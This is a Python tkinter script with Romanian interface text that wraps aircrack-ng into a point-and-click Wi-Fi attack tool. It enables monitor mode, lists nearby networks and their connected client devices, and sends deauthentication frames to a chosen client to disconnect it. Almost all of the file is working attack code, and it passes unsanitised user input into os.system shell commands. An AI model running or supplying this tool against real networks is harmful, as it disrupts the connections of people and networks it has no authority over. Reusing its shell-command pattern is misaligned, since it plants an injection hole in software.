import os
import tkinter as tk
from tkinter import messagebox, filedialog, scrolledtext
from threading import Thread

def start_monitor():
    interface = interface_entry.get()
    if interface:
        os.system(f"airmon-ng start {interface}")
        Thread(target=scan_wifi, args=(interface,)).start()
    else:
        messagebox.showerror("eroare", "introdu o interfata valida.")

def stop_monitor():
    interface = interface_entry.get()
    if interface:
        os.system(f"airmon-ng stop {interface}")
        wifi_listbox.delete(0, tk.END)
        devices_listbox.delete(0, tk.END)
    else:
        messagebox.showerror("eroare", "introdu o interfata valida.")

def scan_wifi(interface):
    wifi_listbox.delete(0, tk.END)
    devices_listbox.delete(0, tk.END)

    os.system(f"timeout 5 airodump-ng {interface} -w /tmp/networks --output-format csv")

    try:
        with open("/tmp/networks-01.csv", "r") as file:
            lines = file.readlines()

            # Parcurgem rețelele disponibile (primele linii relevante)
            for line in lines[2:]:
                if len(line.split(',')) > 13:
                    bssid, channel, essid = line.split(',')[0].strip(), line.split(',')[3].strip(), line.split(',')[13].strip()
                    wifi_listbox.insert(tk.END, f"{essid} ({bssid}) - canal {channel}")

            # Parcurgem dispozitivele conectate (ultimele linii relevante)
            for line in lines[lines.index('\n') + 1:]:
                if len(line.split(',')) > 5:
                    station_mac = line.split(',')[0].strip()
                    ap_mac = line.split(',')[5].strip()
                    devices_listbox.insert(tk.END, f"Stație: {station_mac} - AP: {ap_mac}")

    except FileNotFoundError:
        messagebox.showerror("eroare", "nu s-au putut scana retelele.")

def select_wifi(event):
    selection = wifi_listbox.get(wifi_listbox.curselection())
    bssid, essid = selection.split("(")[1].split(")")[0], selection.split(" ")[0]
    selected_bssid.set(bssid)
    selected_essid.set(essid)
    result_display.insert(tk.END, f"[info] selectat rețea: {essid} | BSSID: {bssid}\n")

def select_device(event):
    selection = devices_listbox.get(devices_listbox.curselection())
    station_mac = selection.split("Stație: ")[1].split(" -")[0]
    selected_device.set(station_mac)
    result_display.insert(tk.END, f"[info] selectat dispozitiv: {station_mac}\n")

def attack_deauth():
    target_bssid = selected_bssid.get()
    target_device = selected_device.get()

    if target_bssid and target_device:
        result_display.insert(tk.END, f"[exec] aireplay-ng --deauth 10 -a {target_bssid} -c {target_device} {interface_entry.get()}\n")
        os.system(f"aireplay-ng --deauth 10 -a {target_bssid} -c {target_device} {interface_entry.get()}")
    else:
        messagebox.showerror("eroare", "selectează un BSSID și un dispozitiv pentru atac deauth.")

root = tk.Tk()
root.title("penetration testing complex - gui")
root.geometry("1200x700")
root.configure(bg="black")

left_frame = tk.Frame(root, bg="black")
left_frame.place(x=20, y=20, width=350, height=660)

tk.Label(left_frame, text="interfață Wi-Fi:", bg="black", fg="green").pack(pady=5)
interface_entry = tk.Entry(left_frame, bg="gray", fg="green")
interface_entry.pack(pady=5)

tk.Button(left_frame, text="Pornește monitor mode", command=start_monitor, bg="gray", fg="green").pack(pady=5)
tk.Button(left_frame, text="Oprește monitor mode", command=stop_monitor, bg="gray", fg="green").pack(pady=5)

tk.Label(left_frame, text="Rețele disponibile:", bg="black", fg="green").pack(pady=5)
wifi_listbox = tk.Listbox(left_frame, bg="black", fg="green", width=50, height=12)
wifi_listbox.pack(pady=5)
wifi_listbox.bind("<<ListboxSelect>>", select_wifi)

tk.Label(left_frame, text="Dispozitive conectate:", bg="black", fg="green").pack(pady=5)
devices_listbox = tk.Listbox(left_frame, bg="black", fg="green", width=50, height=12)
devices_listbox.pack(pady=5)
devices_listbox.bind("<<ListboxSelect>>", select_device)

selected_bssid = tk.StringVar()
selected_essid = tk.StringVar()
selected_device = tk.StringVar()

right_frame = tk.Frame(root, bg="black")
right_frame.place(x=400, y=20, width=770, height=660)

result_display = scrolledtext.ScrolledText(right_frame, bg="black", fg="green", width=92, height=30)
result_display.pack(pady=10)

tk.Button(right_frame, text="Atac Deauth", command=attack_deauth, bg="gray", fg="green", width=30, pady=5).pack()

root.mainloop()
